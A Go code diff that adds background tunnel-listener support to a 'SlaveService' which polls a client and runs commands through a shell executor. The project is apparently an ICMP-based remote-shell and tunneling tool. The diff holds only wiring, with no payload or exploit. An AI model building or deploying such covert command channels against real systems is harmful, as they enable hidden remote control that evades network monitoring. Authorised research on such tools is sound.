@@ -9,6 +9,7 @@ import (
 
 	"protocol/icmp/internal/shell"
 	"protocol/icmp/internal/transport"
+	"protocol/icmp/internal/tunnel"
 )
 
 type SlaveConfig struct {
@@ -19,9 +20,13 @@ type SlaveConfig struct {
 }
 
 type SlaveService struct {
-	Config  SlaveConfig
-	Client  transport.PollClient
+	Config   SlaveConfig
+	Client   transport.PollClient
 	Executor shell.Executor
+
+	// Optional tunnel support
+	TunnelListener *transport.TunnelListener
+	TunnelManager  *tunnel.TunnelManager
 }
 
 func (s SlaveService) Run(ctx context.Context) error {
@@ -32,8 +37,17 @@ func (s SlaveService) Run(ctx context.Context) error {
 		return fmt.Errorf("poll client is required")
 	}
 
-	// Wait, we need a TunnelManager and a TunnelListener here if provided.
-	// For simplicity, we just add the hooks. The actual initialization will be in main.go.
+	if s.TunnelListener != nil && s.TunnelManager != nil {
+		go func() {
+			s.log("Starting TunnelListener in background...\n")
+			err := s.TunnelListener.Listen(ctx, func(payload []byte) {
+				s.TunnelManager.HandlePacket(payload)
+			})
+			if err != nil {
+				s.log("TunnelListener exited: %v\n", err)
+			}
+		}()
+	}
 
 	for {
 		outBuf, err := s.Executor.ReadOutput(ctx)
